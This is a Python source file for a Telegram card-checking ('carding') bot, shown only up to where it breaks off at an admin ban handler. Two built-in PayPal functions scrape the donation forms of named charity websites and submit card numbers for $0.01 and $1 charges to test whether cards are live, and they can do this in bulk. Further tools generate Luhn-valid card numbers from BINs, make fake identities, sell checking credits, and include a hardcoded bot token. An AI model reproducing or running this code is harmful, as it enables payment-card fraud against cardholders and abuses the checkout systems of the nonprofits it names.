import telebot
import time
import threading
import random
import os
import re
import json
import string
import requests
from datetime import datetime
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ==================== البوابات الشغالة فقط ====================
from reg import reg
from Strip import Stripe1
from strip_Auth3 import Stripe3
from braintree_charge import BraC
from Donate2 import charge1usd
from stripe_donate_rbe import stripe_donate_rbe

# ==================== إعدادات البوت ====================
TOKEN = '8490768092:AAEaT19o_y9udS68ZWLqT0b6HhbGK-Zc8BA'
ADMIN_ID = 1489001988
bot = telebot.TeleBot(TOKEN)

# ==================== ملفات البيانات ====================
USERS_FILE = "users_data.json"
CODES_FILE = "codes.json"

def load_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_users(users):
    with open(USERS_FILE, 'w', encoding='utf-8') as f:
        json.dump(users, f, indent=4, ensure_ascii=False)

def load_codes():
    if os.path.exists(CODES_FILE):
        with open(CODES_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_codes(codes):
    with open(CODES_FILE, 'w', encoding='utf-8') as f:
        json.dump(codes, f, indent=4, ensure_ascii=False)

users_data = load_users()
codes_data = load_codes()

# متغيرات عامة
pending_mass_cards = {}
current_checks = {}
stop_check_flags = {}
user_messages = {}
gen_states = {}

# ==================== دوال مساعدة ====================
def clean_text(text):
    text = re.sub(r'<[^>]+>', '', text)
    text = text.replace('*', '').replace('_', '').replace('`', '')
    return text

def edit_or_send(user_id, text, reply_markup=None):
    clean = clean_text(text)
    if user_id in user_messages:
        try:
            bot.edit_message_text(clean, user_id, user_messages[user_id], reply_markup=reply_markup)
            return user_messages[user_id]
        except:
            pass
    msg = bot.send_message(user_id, clean, reply_markup=reply_markup)
    user_messages[user_id] = msg.message_id
    return msg.message_id

# ==================== إدارة المستخدمين ====================
def create_user(user_id, username, first_name):
    user_id_str = str(user_id)
    if user_id_str not in users_data:
        users_data[user_id_str] = {
            "name": first_name,
            "username": username,
            "points": 10,
            "total_checks": 0,
            "approved_checks": 0,
            "banned": False,
            "join_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        save_users(users_data)
    return users_data[user_id_str]

def get_user(user_id, username=None, first_name=None):
    user_id_str = str(user_id)
    if user_id_str not in users_data:
        return create_user(user_id, username, first_name)
    return users_data[user_id_str]

def is_banned(user_id):
    user_id_str = str(user_id)
    if user_id_str in users_data:
        return users_data[user_id_str].get("banned", False)
    return False

def check_points(user_id, required=1):
    if user_id == ADMIN_ID:
        return True
    user_id_str = str(user_id)
    if user_id_str not in users_data:
        create_user(user_id, None, "User")
    user = users_data[user_id_str]
    if user.get("banned", False):
        edit_or_send(user_id, "🚫 You are banned")
        return False
    if user.get("points", 0) >= required:
        users_data[user_id_str]["points"] -= required
        save_users(users_data)
        return True
    else:
        edit_or_send(user_id, f"❌ Not enough points!\n⭐ Your points: {user.get('points', 0)}")
        return False

def add_points(user_id, points):
    user_id_str = str(user_id)
    if user_id_str in users_data:
        users_data[user_id_str]["points"] += points
        save_users(users_data)
        return True
    return False

def get_user_points(user_id):
    user_id_str = str(user_id)
    if user_id_str in users_data:
        return users_data[user_id_str].get("points", 0)
    return 0

def update_stats(user_id, approved):
    user_id_str = str(user_id)
    if user_id_str in users_data:
        users_data[user_id_str]["total_checks"] = users_data[user_id_str].get("total_checks", 0) + 1
        if approved:
            users_data[user_id_str]["approved_checks"] = users_data[user_id_str].get("approved_checks", 0) + 1
        save_users(users_data)

# ==================== نظام الكودات ====================
def create_code(points, max_uses=1):
    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    codes_data[code] = {
        'points': points,
        'used': False,
        'max_uses': max_uses,
        'used_count': 0,
        'used_by': [],
        'used_at': None,
        'created_at': datetime.now().isoformat(),
        'created_by': ADMIN_ID
    }
    save_codes(codes_data)
    return code

def redeem_code(user_id, code):
    if code not in codes_data:
        return False, "❌ Invalid code"
    code_info = codes_data[code]
    if code_info.get('used_count', 0) >= code_info.get('max_uses', 1):
        return False, "❌ This code has expired"
    points = code_info['points']
    add_points(user_id, points)
    code_info['used_count'] = code_info.get('used_count', 0) + 1
    code_info['used_by'].append(str(user_id))
    code_info['used_at'] = datetime.now().isoformat()
    if code_info['used_count'] >= code_info.get('max_uses', 1):
        code_info['used'] = True
    save_codes(codes_data)
    return True, f"✅ Code activated!\n⭐ Added {points} points\n⭐ Your balance: {get_user_points(user_id)} points"

# ==================== القوائم ====================
def main_menu(user_id=None):
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("💳 Payment Gateways", callback_data="check_menu"),
        InlineKeyboardButton("🛠 Tools", callback_data="tools_menu")
    )
    keyboard.add(
        InlineKeyboardButton("💎 Buy Points", callback_data="buy_menu"),
        InlineKeyboardButton("📊 Bot Info", callback_data="info")
    )
    keyboard.add(
        InlineKeyboardButton("🏅 Register", callback_data="register")
    )
    if user_id == ADMIN_ID:
        keyboard.add(
            InlineKeyboardButton("📊 Admin Panel", callback_data="admin_panel")
        )
    return keyboard

def get_check_menu():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("💳 Stripe 1", callback_data="check_str1"),
        InlineKeyboardButton("💳 Stripe 3", callback_data="check_str3"),
        InlineKeyboardButton("⚡ Braintree Charge", callback_data="check_chb"),
        InlineKeyboardButton("💰 PayPal Charge $1", callback_data="check_live1"),
        InlineKeyboardButton("💎 Stripe Donate RBE", callback_data="check_rbe"),
        InlineKeyboardButton("💸 PayPal 0.01$", callback_data="check_pp1"),
        InlineKeyboardButton("💸 PayPal 1$", callback_data="check_pp2"),
        InlineKeyboardButton("📁 File Check", callback_data="file_menu"),
        InlineKeyboardButton("📊 Mass Check", callback_data="mass_menu"),
        InlineKeyboardButton("🔙 Back", callback_data="back_main")
    )
    # ترتيب الأزرار في صفوف
    keyboard.row_width = 2
    return keyboard

def get_tools_menu():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("🎲 Generate Cards", callback_data="gen_menu"),
        InlineKeyboardButton("🔍 BIN Lookup", callback_data="bin_menu"),
        InlineKeyboardButton("📄 Fake Info", callback_data="fake_menu"),
        InlineKeyboardButton("⭐ My Balance", callback_data="points_menu"),
        InlineKeyboardButton("🔙 Back", callback_data="back_main")
    )
    return keyboard

def get_buy_menu():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("⭐ 10 Points = Trial Code", callback_data="buy_10"),
        InlineKeyboardButton("⭐ 50 Points = Trial Code", callback_data="buy_50"),
        InlineKeyboardButton("⭐ 100 Points = Trial Code", callback_data="buy_100")
    )
    keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="back_main"))
    return keyboard

def get_gen_menu():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("🎲 Single BIN", callback_data="gen_single"),
        InlineKeyboardButton("📚 Multiple BINs", callback_data="gen_multi"),
        InlineKeyboardButton("🔙 Back", callback_data="tools_menu")
    )
    return keyboard

def get_fake_country_menu():
    keyboard = InlineKeyboardMarkup(row_width=2)
    for country in ["🇺🇸 USA", "🇬🇧 UK", "🇨🇦 Canada", "🇩🇪 Germany", "🇫🇷 France", "🇮🇹 Italy"]:
        keyboard.add(InlineKeyboardButton(country, callback_data=f"fake_{country}"))
    keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="tools_menu"))
    return keyboard

def get_mass_gateways_menu():
    keyboard = InlineKeyboardMarkup(row_width=2)
    gateways = [
        ("Stripe 1", "mass_str1"),
        ("Stripe 3", "mass_str3"),
        ("Braintree Charge", "mass_chb"),
        ("PayPal Charge $1", "mass_live1"),
        ("Stripe Donate RBE", "mass_rbe"),
        ("PayPal 0.01$", "mass_pp1"),
        ("PayPal 1$", "mass_pp2")
    ]
    for name, callback in gateways:
        keyboard.add(InlineKeyboardButton(name, callback_data=callback))
    keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="check_menu"))
    return keyboard

def get_admin_panel():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("📊 Statistics", callback_data="admin_stats"),
        InlineKeyboardButton("🎫 Create Code", callback_data="admin_makecode"),
        InlineKeyboardButton("➕ Add Points", callback_data="admin_addpoints"),
        InlineKeyboardButton("🚫 Ban User", callback_data="admin_ban"),
        InlineKeyboardButton("✅ Unban User", callback_data="admin_unban"),
        InlineKeyboardButton("📋 Users List", callback_data="admin_users"),
        InlineKeyboardButton("🔙 Back", callback_data="back_main")
    )
    return keyboard

def get_count_keyboard(bin_input, gen_type):
    keyboard = InlineKeyboardMarkup(row_width=4)
    counts = [10, 20, 50, 80, 100, 150, 200]
    for count in counts:
        keyboard.add(InlineKeyboardButton(str(count), callback_data=f"gen_count_{gen_type}_{bin_input}_{count}"))
    keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="gen_menu"))
    return keyboard

# ==================== دوال مساعدة ====================
def get_bin_info(bin_code):
    try:
        url = f"https://lookup.binlist.net/{bin_code[:6]}"
        resp = requests.get(url, timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            scheme = data.get('scheme', 'Unknown').upper()
            brand = data.get('brand', 'Unknown')
            type_ = data.get('type', 'Unknown').upper()
            country = data.get('country', {}).get('name', 'Unknown')
            emoji = data.get('country', {}).get('emoji', '')
            bank = data.get('bank', {}).get('name', 'Unknown')
            return f"🏦 Bank: {bank} {emoji}\n💳 Type: {scheme} - {type_} - {brand}\n🌍 Country: {country} {emoji}\n━━━━━━━━━━━━━━━\n🔢 BIN: {bin_code[:6]}"
    except:
        pass
    return "❌ Cannot get BIN info"

def generate_fake_info(country):
    countries_data = {
        "🇺🇸 USA": {"first": ["John","James","Robert"], "last":["Smith","Johnson","Williams"], "address":["6200 Phyllis Dr"], "city":["New York"], "state":["NY"], "zip":["10090"], "phone":["+15416450372"]},
        "🇬🇧 UK": {"first":["James","David","John"], "last":["Smith","Jones","Taylor"], "address":["221 Baker St"], "city":["London"], "state":["London"], "zip":["NW1 6XE"], "phone":["+442079460958"]},
        "🇨🇦 Canada": {"first":["Liam","Noah","William"], "last":["Smith","Brown","Tremblay"], "address":["123 Queen St"], "city":["Toronto"], "state":["ON"], "zip":["M5V 2T6"], "phone":["+14165551234"]},
        "🇩🇪 Germany": {"first":["Max","Alexander","Paul"], "last":["Muller","Schmidt","Schneider"], "address":["Hauptstrasse 1"], "city":["Berlin"], "state":["Berlin"], "zip":["10115"], "phone":["+49301234567"]},
        "🇫🇷 France": {"first":["Lucas","Louis","Jules"], "last":["Martin","Bernard","Dubois"], "address":["10 Rue de la Paix"], "city":["Paris"], "state":["Paris"], "zip":["75001"], "phone":["+33123456789"]},
        "🇮🇹 Italy": {"first":["Leonardo","Francesco","Alessandro"], "last":["Rossi","Russo","Ferrari"], "address":["Via Roma 1"], "city":["Rome"], "state":["RM"], "zip":["00100"], "phone":["+39061234567"]},
    }
    d = countries_data.get(country, countries_data["🇺🇸 USA"])
    first = random.choice(d["first"])
    last = random.choice(d["last"])
    email = f"{first.lower()}.{last.lower()}{random.randint(1,999)}@gmail.com"
    return f"""🌍 Shipping Info - {country}
━━━━━━━━━━━━━━━
👤 Name: {first} {last}
📧 Email: {email}
🏠 Address: {random.choice(d['address'])}
🌆 City: {random.choice(d['city'])}
📍 State: {random.choice(d['state']) if isinstance(d['state'], list) else d['state']}
📮 Zip: {random.choice(d['zip']) if isinstance(d['zip'], list) else d['zip']}
📞 Phone: {random.choice(d['phone']) if isinstance(d['phone'], list) else d['phone']}
━━━━━━━━━━━━━━━
👨‍💻 Dev: @S3s_A"""

def extract_cards_from_message(text):
    cards = []
    lines = text.strip().split('\n')
    for line in lines:
        line = line.strip()
        match = re.search(r'(\d{15,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})', line)
        if match:
            card_num = match.group(1)
            month = match.group(2).zfill(2)
            year = match.group(3)
            cvv = match.group(4)
            if len(year) == 2:
                year = f"20{year}"
            cards.append(f"{card_num}|{month}|{year}|{cvv}")
    return cards

def format_result(gateway_name, card, status, response, exec_time):
    bin_info = get_bin_info(card[:6])
    return f"""
┏━━━━━━━━━━━━━━━━━━━━┓
┃ #{gateway_name}
┣━━━━━━━━━━━━━━━━━━━━┫
┣ 💳 Card: {card}
┣ 📊 Status: {status}
┣ 💬 Response: {response[:80]}
┣━━━━━━━━━━━━━━━━━━━━┫
┃ {bin_info}
┣━━━━━━━━━━━━━━━━━━━━┫
┣ ⏱️ Time: {exec_time:.2f} sec
┗━━━━━━━━━━━━━━━━━━━━┛

👨‍💻 Dev: @S3s_A
"""

def generate_cards(bin_input, count):
    def luhn_checksum(num):
        digits = [int(d) for d in str(num)]
        odd_sum = sum(digits[-1::-2])
        even_sum = sum(sum(divmod(2*d, 10)) for d in digits[-2::-2])
        return (odd_sum + even_sum) % 10
    
    bin_prefix = bin_input[:6] if len(bin_input) >= 6 else bin_input
    card_length = 15 if bin_prefix.startswith('3') else 16
    cards = []
    for _ in range(count):
        remaining = card_length - len(bin_prefix)
        if remaining > 0:
            random_digits = ''.join(random.choices(string.digits, k=remaining))
            card_num = bin_prefix + random_digits
        else:
            card_num = bin_prefix[:card_length]
        card_num = card_num[:-1] + str(luhn_checksum(card_num[:-1]))
        month = str(random.randint(1, 12)).zfill(2)
        year = str(random.randint(2026, 2031))
        cvv = ''.join(random.choices(string.digits, k=3))
        cards.append(f"{card_num}|{month}|{year}|{cvv}")
    return cards

def get_user_plan(user_id):
    user = users_data.get(str(user_id), {})
    if user.get('banned', False):
        return "Banned", "0"
    points = user.get('points', 0)
    if points >= 100:
        return "Premium", f"{points} points"
    elif points >= 50:
        return "Gold", f"{points} points"
    else:
        return "Free", f"{points} points"

def register_user(user_id, username, first_name):
    create_user(user_id, username, first_name)

# ==================== بوابات PayPal المدمجة ====================
def check_paypal_gate1(card):
    try:
        import base64
        ccx = card.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3].strip()
        if "20" in yy:
            yy = yy.split("20")[1]
        session = requests.Session()
        headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'}
        response = session.get("https://osuawareness.org/donation/", headers=headers, timeout=30)
        id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text).group(1)
        id_form2 = re.search(r'name="give-form-id" value="(.*?)"', response.text).group(1)
        nonce = re.search(r'name="give-form-hash" value="(.*?)"', response.text).group(1)
        enc = re.search(r'"data-client-token":"(.*?)"', response.text).group(1)
        dec = base64.b64decode(enc).decode('utf-8')
        au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
        data = {'give-honeypot': '', 'give-form-id-prefix': id_form1, 'give-form-id': id_form2, 'give-form-title': '', 'give-current-url': 'https://osuawareness.org/donation/', 'give-form-url': 'https://osuawareness.org/donation/', 'give-form-minimum': '0.01', 'give-form-maximum': '999999.99', 'give-form-hash': nonce, 'give-price-id': '3', 'give-recurring-logged-in-only': '', 'give-logged-in-only': '1', '_give_is_donation_recurring': '0', 'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}', 'give-amount': '0.01', 'give_stripe_payment_method': '', 'payment-mode': 'paypal-commerce', 'give_first': 'Test', 'give_last': 'User', 'give_email': 'test@gmail.com', 'card_name': 'Test User', 'card_exp_month': '', 'card_exp_year': '', 'give_action': 'purchase', 'give-gateway': 'paypal-commerce', 'action': 'give_process_donation', 'give_ajax': 'true'}
        session.post('https://osuawareness.org/wp-admin/admin-ajax.php', data=data, timeout=30)
        data2 = {'give-honeypot': '', 'give-form-id-prefix': id_form1, 'give-form-id': id_form2, 'give-form-title': '', 'give-current-url': 'https://osuawareness.org/donation/', 'give-form-url': 'https://osuawareness.org/donation/', 'give-form-minimum': '0.01', 'give-form-maximum': '999999.99', 'give-form-hash': nonce, 'give-price-id': '3', 'give-recurring-logged-in-only': '', 'give-logged-in-only': '1', '_give_is_donation_recurring': '0', 'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}', 'give-amount': '0.01', 'give_stripe_payment_method': '', 'payment-mode': 'paypal-commerce', 'give_first': 'Test', 'give_last': 'User', 'give_email': 'test@gmail.com', 'card_name': 'Test User', 'card_exp_month': '', 'card_exp_year': '', 'give-gateway': 'paypal-commerce'}
        response2 = session.post('https://osuawareness.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order', data=data2, timeout=30)
        tok = response2.json()['data']['id']
        headers2 = {'authority': 'cors.api.paypal.com', 'accept': '*/*', 'authorization': f'Bearer {au}', 'content-type': 'application/json', 'user-agent': 'Mozilla/5.0'}
        json_data = {'payment_source': {'card': {'number': n, 'expiry': f'20{yy}-{mm}', 'security_code': cvc, 'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}}}}, 'application_context': {'vault': False}}
        response3 = session.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', headers=headers2, json=json_data, timeout=30)
        if response3.status_code == 200:
            return "✅ Charged"
        else:
            return "❌ Declined"
    except Exception as e:
        return f"❌ Error: {str(e)[:50]}"

def check_paypal_gate2(card):
    try:
        import base64
        ccx = card.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3].strip()
        if "20" in yy:
            yy = yy.split("20")[1]
        session = requests.Session()
        headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'}
        response = session.get("https://www.northidahowaterpolo.org/donations/donation-form/", headers=headers, timeout=30)
        id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text).group(1)
        id_form2 = re.search(r'name="give-form-id" value="(.*?)"', response.text).group(1)
        nonce = re.search(r'name="give-form-hash" value="(.*?)"', response.text).group(1)
        enc = re.search(r'"data-client-token":"(.*?)"', response.text).group(1)
        dec = base64.b64decode(enc).decode('utf-8')
        au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
        data = {'give-honeypot': '', 'give-form-id-prefix': id_form1, 'give-form-id': id_form2, 'give-form-title': '', 'give-current-url': 'https://www.northidahowaterpolo.org/donations/donation-form/', 'give-form-url': 'https://www.northidahowaterpolo.org/donations/donation-form/', 'give-form-minimum': '1', 'give-form-maximum': '999999.99', 'give-form-hash': nonce, 'give-price-id': '3', 'give-recurring-logged-in-only': '', 'give-logged-in-only': '1', '_give_is_donation_recurring': '0', 'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}', 'give-amount': '1', 'give_stripe_payment_method': '', 'payment-mode': 'paypal-commerce', 'give_first': 'Test', 'give_last': 'User', 'give_email': 'test@gmail.com', 'card_name': 'Test User', 'card_exp_month': '', 'card_exp_year': '', 'give_action': 'purchase', 'give-gateway': 'paypal-commerce', 'action': 'give_process_donation', 'give_ajax': 'true'}
        session.post('https://www.northidahowaterpolo.org/wp-admin/admin-ajax.php', data=data, timeout=30)
        data2 = {'give-honeypot': '', 'give-form-id-prefix': id_form1, 'give-form-id': id_form2, 'give-form-title': '', 'give-current-url': 'https://www.northidahowaterpolo.org/donations/donation-form/', 'give-form-url': 'https://www.northidahowaterpolo.org/donations/donation-form/', 'give-form-minimum': '1', 'give-form-maximum': '999999.99', 'give-form-hash': nonce, 'give-price-id': '3', 'give-recurring-logged-in-only': '', 'give-logged-in-only': '1', '_give_is_donation_recurring': '0', 'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}', 'give-amount': '1', 'give_stripe_payment_method': '', 'payment-mode': 'paypal-commerce', 'give_first': 'Test', 'give_last': 'User', 'give_email': 'test@gmail.com', 'card_name': 'Test User', 'card_exp_month': '', 'card_exp_year': '', 'give-gateway': 'paypal-commerce'}
        response2 = session.post('https://www.northidahowaterpolo.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order', data=data2, timeout=30)
        tok = response2.json()['data']['id']
        headers2 = {'authority': 'cors.api.paypal.com', 'accept': '*/*', 'authorization': f'Bearer {au}', 'content-type': 'application/json', 'user-agent': 'Mozilla/5.0'}
        json_data = {'payment_source': {'card': {'number': n, 'expiry': f'20{yy}-{mm}', 'security_code': cvc, 'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}}}}, 'application_context': {'vault': False}}
        response3 = session.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', headers=headers2, json=json_data, timeout=30)
        if response3.status_code == 200:
            return "✅ Charged"
        else:
            return "❌ Declined"
    except Exception as e:
        return f"❌ Error: {str(e)[:50]}"

# ==================== دوال الفحص ====================
def check_single_card(user_id, card, gateway_func, gateway_name, message_id=None):
    if is_banned(user_id):
        edit_or_send(user_id, "🚫 You are banned")
        return
    if not check_points(user_id):
        return
    
    if not message_id:
        msg = bot.send_message(user_id, "⏳ Checking...")
        message_id = msg.message_id
        user_messages[user_id] = message_id
    
    try:
        start_time = time.time()
        result = str(gateway_func(card))
        exec_time = time.time() - start_time
        
        if "Charged" in result or "✅" in result or "Approved" in result:
            status = "✅ Charged"
            approved = True
        elif "Insufficient" in result:
            status = "💰 Insufficient Funds"
            approved = True
        else:
            status = "❌ Declined"
            approved = False
        
        msg_text = format_result(gateway_name, card, status, result, exec_time)
        bot.edit_message_text(msg_text, user_id, message_id)
        update_stats(user_id, approved)
        
    except Exception as e:
        bot.edit_message_text(f"❌ Error: {str(e)[:100]}", user_id, message_id)

def check_mass_cards(user_id, cards, gateway_func, gateway_name, message_id, stop_key):
    total = len(cards)
    approved = 0
    declined = 0
    current_card = "Loading..."
    current_status = "Checking..."
    
    def update_display():
        kb = InlineKeyboardMarkup(row_width=1)
        card_preview = current_card[:30] + "..." if len(current_card) > 30 else current_card
        kb.add(
            InlineKeyboardButton(f"💳 Card: {card_preview}", callback_data="none"),
            InlineKeyboardButton(f"📡 Status: {current_status[:35]}", callback_data="none"),
            InlineKeyboardButton(f"✅ Charged: {approved}", callback_data="none"),
            InlineKeyboardButton(f"❌ Declined: {declined}", callback_data="none"),
            InlineKeyboardButton(f"📊 Total: {approved + declined}/{total}", callback_data="none"),
            InlineKeyboardButton(f"⚡ {gateway_name}", callback_data="none"),
            InlineKeyboardButton("🛑 Stop", callback_data=f"stop_{stop_key}")
        )
        try:
            bot.edit_message_reply_markup(user_id, message_id, reply_markup=kb)
        except:
            pass
    
    for i, card in enumerate(cards, 1):
        if stop_check_flags.get(stop_key, False):
            edit_or_send(user_id, "🛑 Check stopped")
            break
        
        if not check_points(user_id):
            edit_or_send(user_id, "❌ Not enough points to complete check")
            break
        
        current_card = card
        try:
            start_time = time.time()
            result = str(gateway_func(card))
            exec_time = time.time() - start_time
            current_status = f"{result[:35]} | {exec_time:.1f}s"
            
            if "Charged" in result or "✅" in result or "Approved" in result:
                approved += 1
                msg_text = format_result(gateway_name, card, "✅ Charged", result, exec_time)
                bot.send_message(user_id, msg_text)
                update_stats(user_id, True)
            else:
                declined += 1
                update_stats(user_id, False)
            
            update_display()
            time.sleep(25)
            
        except Exception as e:
            current_status = f"Error: {str(e)[:30]}"
            declined += 1
            update_display()
            time.sleep(25)
    
    final_text = f"""✅ Check completed
━━━━━━━━━━━━━━━
✅ Charged: {approved}
❌ Declined: {declined}
📊 Total: {total}"""
    
    try:
        bot.edit_message_text(final_text, user_id, message_id)
    except:
        edit_or_send(user_id, final_text)
    
    if stop_key in stop_check_flags:
        del stop_check_flags[stop_key]
    if user_id in current_checks:
        del current_checks[user_id]

# ==================== أوامر البوت الأساسية ====================
@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    username = message.from_user.username
    first_name = message.from_user.first_name
    get_user(user_id, username, first_name)
    
    welcome_text = f"""━━━━━━━━━━━━━━━━━━━━━
🤖 𝐁𝐎𝐓 𝐂𝐇𝐄𝐂𝐊𝐄𝐑
━━━━━━━━━━━━━━━━━━━━━
✨ Welcome {first_name} ✨

Choose from the menu below
━━━━━━━━━━━━━━━━━━━━━"""
    
    msg = bot.send_message(user_id, welcome_text, reply_markup=main_menu(user_id))
    user_messages[user_id] = msg.message_id

@bot.message_handler(commands=['points'])
def points_command(message):
    user_id = message.from_user.id
    points = get_user_points(user_id)
    bot.reply_to(message, f"⭐ Your balance: {points} points\n━━━━━━━━━━━━━━━━\n📌 Each check costs 1 point")

@bot.message_handler(commands=['bin'])
def bin_command(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned")
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ /bin <BIN>\nExample: /bin 528445")
        return
    info = get_bin_info(parts[1][:6])
    bot.reply_to(message, info)

@bot.message_handler(commands=['fk'])
def fake_command(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned")
        return
    parts = message.text.split()
    country = parts[1] if len(parts) > 1 else "🇺🇸 USA"
    info = generate_fake_info(country)
    bot.reply_to(message, info)

@bot.message_handler(commands=['redeem'])
def redeem_command(message):
    user_id = message.from_user.id
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "⚠️ /redeem <code>\nExample: /redeem 0PWQ9I3O")
            return
        code = parts[1].strip()
        success, msg = redeem_code(user_id, code)
        bot.reply_to(message, msg)
    except:
        bot.reply_to(message, "⚠️ /redeem <code>")

# ==================== أوامر الفحص الفردي ====================
@bot.message_handler(commands=['str1'])
def cmd_str1(m): 
    user_id = m.from_user.id
    card = m.text.replace('/str1', '').strip()
    if not card:
        bot.reply_to(m, "⚠️ /str1 number|month|year|cvv")
        return
    check_single_card(user_id, card, Stripe1, "Stripe 1")

@bot.message_handler(commands=['str3'])
def cmd_str3(m): 
    user_id = m.from_user.id
    card = m.text.replace('/str3', '').strip()
    if not card:
        bot.reply_to(m, "⚠️ /str3 number|month|year|cvv")
        return
    check_single_card(user_id, card, Stripe3, "Stripe 3")

@bot.message_handler(commands=['chb'])
def cmd_chb(m): 
    user_id = m.from_user.id
    card = m.text.replace('/chb', '').strip()
    if not card:
        bot.reply_to(m, "⚠️ /chb number|month|year|cvv")
        return
    check_single_card(user_id, card, BraC, "Braintree Charge")

@bot.message_handler(commands=['live1'])
def cmd_live1(m): 
    user_id = m.from_user.id
    card = m.text.replace('/live1', '').strip()
    if not card:
        bot.reply_to(m, "⚠️ /live1 number|month|year|cvv")
        return
    check_single_card(user_id, card, charge1usd, "PayPal Charge $1")

@bot.message_handler(commands=['pp1'])
def cmd_pp1(m): 
    user_id = m.from_user.id
    card = m.text.replace('/pp1', '').strip()
    if not card:
        bot.reply_to(m, "⚠️ /pp1 number|month|year|cvv")
        return
    check_single_card(user_id, card, check_paypal_gate1, "PayPal 0.01$")

@bot.message_handler(commands=['pp2'])
def cmd_pp2(m): 
    user_id = m.from_user.id
    card = m.text.replace('/pp2', '').strip()
    if not card:
        bot.reply_to(m, "⚠️ /pp2 number|month|year|cvv")
        return
    check_single_card(user_id, card, check_paypal_gate2, "PayPal 1$")

@bot.message_handler(commands=['rbe'])
def cmd_rbe(m): 
    user_id = m.from_user.id
    card = m.text.replace('/rbe', '').strip()
    if not card:
        bot.reply_to(m, "⚠️ /rbe number|month|year|cvv")
        return
    check_single_card(user_id, card, stripe_donate_rbe, "Stripe Donate RBE")

# ==================== أوامر الأدمن ====================
@bot.message_handler(commands=['makecode'])
def make_code_command(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, "⛔ Admin only")
        return
    try:
        points = int(message.text.split()[1])
        max_uses = 1
        if len(message.text.split()) > 2:
            max_uses = int(message.text.split()[2])
        if points <= 0:
            bot.reply_to(message, "⚠️ Points must be greater than 0")
            return
        code = create_code(points, max_uses)
        bot.reply_to(message, f"""✅ Code created!
━━━━━━━━━━━━━━━━
🔑 Code: {code}
⭐ Points: {points}
👥 Max uses: {max_uses}
━━━━━━━━━━━━━━━━
📌 Use: /redeem {code}""")
    except:
        bot.reply_to(message, "⚠️ /makecode <points> <max_uses>\nExample: /makecode 50 10")

@bot.message_handler(commands=['addpoints'])
def addpoints_command(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        return
    try:
        parts = message.text.split()
        target_id = int(parts[1])
        points = int(parts[2])
        add_points(target_id, points)
        bot.reply_to(message, f"✅ Added {points} points to user {target_id}")
        bot.send_message(target_id, f"✅ Added {points} points to your balance")
    except:
        bot.reply_to(message, "❌ /addpoints <user_id> <points>")

@bot.message_handler(commands=['removepoints'])
def removepoints_command(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        return
    try:
        parts = message.text.split()
        target_id = int(parts[1])
        points = int(parts[2])
        user_data = users_data.get(str(target_id), {})
        current_points = user_data.get('points', 0)
        if current_points < points:
            bot.reply_to(message, f"⚠️ User has only {current_points} points")
            return
        users_data[str(target_id)]["points"] -= points
        save_users(users_data)
        bot.reply_to(message, f"✅ Removed {points} points from user {target_id}")
        bot.send_message(target_id, f"⚠️ Removed {points} points from your balance\n⭐ New balance: {get_user_points(target_id)}")
    except:
        bot.reply_to(message, "❌ /removepoints <user_id> <points>")

@bot.message_handler(commands=['setpoints'])
def setpoints_command(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        return
    try:
        parts = message.text.split()
        target_id = int(parts[1])
        points = int(parts[2])
        if points < 0:
            bot.reply_to(message, "⚠️ Points cannot be negative")
            return
        if str(target_id) not in users_data:
            create_user(target_id, "", "")
        users_data[str(target_id)]["points"] = points
        save_users(users_data)
        bot.reply_to(message, f"✅ Set user {target_id} balance to {points} points")
        bot.send_message(target_id, f"✅ Your balance has been set to {points} points")
    except:
        bot.reply_to(message, "❌ /setpoints <user_id> <points>")

@bot.message_handler(commands=['ban'])
